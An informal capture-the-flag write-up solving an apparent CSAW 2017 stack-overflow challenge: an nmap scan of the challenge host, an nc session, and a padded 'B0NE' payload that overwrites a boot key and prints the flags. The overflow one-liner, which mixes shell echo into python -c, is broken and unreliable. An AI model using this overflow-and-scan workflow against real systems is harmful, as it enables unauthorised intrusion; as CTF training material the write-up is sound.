this appears to be a remote binex chal. 
we need to overflow the input buffer to take control of the 'boot key' value on the stack
so that the flag is printed.

this is really trivial: python -c "echo '.'*0x28+'B0NE'">input
then to verify against the local binary: cat input - |freedomboot

it seems to work.
so, now we must find the remote server.

so, similar to backdoor we nmap the host:

```
$ nmap.exe -A -Pn clearsoc.hsf.csaw.io -p 0-10000

Starting Nmap 7.60 ( https://nmap.org ) at 2017-09-26 00:08 Eastern Daylight Time
Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.38% done; ETC: 00:11 (0:01:00 remaining)
Stats: 0:04:30 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 00:13 (0:00:21 remaining)
Stats: 0:04:35 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 00:13 (0:00:22 remaining)
Nmap scan report for clearsoc.hsf.csaw.io (216.165.2.41)
Host is up (0.017s latency).
rDNS record for 216.165.2.41: HSF-CHAL-2.OSIRIS.CYBER.NYU.EDU
Not shown: 9996 filtered ports
PORT     STATE  SERVICE     VERSION
43/tcp   closed whois
80/tcp   open   http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Did not follow redirect to https://clearsoc.hsf.csaw.io/
443/tcp  open   ssl/http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Clearsoc
| ssl-cert: Subject: organizationName=Clearsoc/stateOrProvinceName=New York/countryName=US
| Not valid before: 2017-09-21T13:23:38
|_Not valid after:  2018-09-21T13:23:38
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
7070/tcp open   realserver?
| fingerprint-strings:
|   DNSStatusRequest, Help, Kerberos, LPDString, NULL, SIPOptions, TLSSessionReq:
|_    flag{that_aint_g0pher}
8080/tcp open   http-proxy?
| fingerprint-strings:
|   GetRequest:
|     freedomboot-4.0-7318-g129462d Thu May 25 03:13:26 PST 2017 starting...
|     System Integrity Rating: Six Point Five (6.5)
|     CPU: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
|     Board: PL-OV9000+: Vegeta board + LX200 GCHQ + Russian bitstream
|     MAC: 01:23:13:37:32:10
|     54.69.208.39
|     running main(bist = 0)
|     WARNING: Ignoring Hillary's Email violation.
|     TRUMPBus controller enabled.
|     Found compatible clock / CAS pair: 533 /7.
|     Initializing system memory..........
|     Boot sequence interrupted, DEBUG mode active.
|     BOOT_SERVER: freedomboot.cyberpolice.co
|     BOOT_DEVICE: eth0
|     DEFAULT_BOOT_KEY: 0x45455246
|     Configure BOOT_KEY (enter for default): BOOT_KEY=0x45455246 (FREE)
|     Initializing random number generator... done.
|     Freeing unused kernel memory: 72k freed
|     Starting network...
|     Starting sshd: OK
|     Starting NFS daemon: done
|     00:00:00 2017
|     Mounting Other NFS Filesystems
|     Login
|   NULL:
|     freedomboot-4.0-7318-g129462d Thu May 25 03:13:26 PST 2017 starting...
|     System Integrity Rating: Six Point Five (6.5)
|     CPU: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
|     Board: PL-OV9000+: Vegeta board + LX200 GCHQ + Russian bitstream
|     MAC: 01:23:13:37:32:10
|     54.69.208.39
|     running main(bist = 0)
|     WARNING: Ignoring Hillary's Email violation.
|     TRUMPBus controller enabled.
|     Found compatible clock / CAS pair: 533 /7.
|     Initializing system memory..........
|     Boot sequence interrupted, DEBUG mode active.
|     BOOT_SERVER: freedomboot.cyberpolice.co
|     BOOT_DEVICE: eth0
|     DEFAULT_BOOT_KEY: 0x45455246
|_    Configure BOOT_KEY (enter for default):


we see the service we are looking for. great.
so we simply send input at it, and we get the flag.

nc clearsoc.hsf.csaw.io 8080
freedomboot-4.0-7318-g129462d Thu May 25 03:13:26 PST 2017 starting...
System Integrity Rating: Six Point Five (6.5)

CPU:    Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
Board:  PL-OV9000+: Vegeta board + LX200 GCHQ + Russian bitstream
MAC:    01:23:13:37:32:10
IP:     54.69.208.39

running main(bist = 0)
WARNING: Ignoring Hillary's Email violation.
TRUMPBus controller enabled.
Found compatible clock / CAS pair: 533 /7.

Initializing system memory..........
[!] Boot sequence interrupted, DEBUG mode active.

    BOOT_SERVER:      freedomboot.cyberpolice.co
    BOOT_DEVICE:      eth0
    DEFAULT_BOOT_KEY: 0x45455246

Configure BOOT_KEY (enter for default): ........................................B0NE
BOOT_KEY=0x454e3042 (B0NE)

*******************************************
*** WARNING: BOOT_KEY OVERRIDE DETECTED ***
*******************************************
Triggering agency boot sequence:
  Reporting user to cyber police... done
  Backtracing internet protocol address... done
  Backing up system keystrokes to cloud... done
  Backdooring crypto algorithms... done
  Scanning storage for fake news... done

De-classifying secure boot vault...
|
+-->  flag{fr33d0m_41NT_fr33}
```

Since the exploit payload is plain text, we don't even need to bother with pipes. the clipboard suffices.

`flag{fr33d0m_41NT_fr33}`
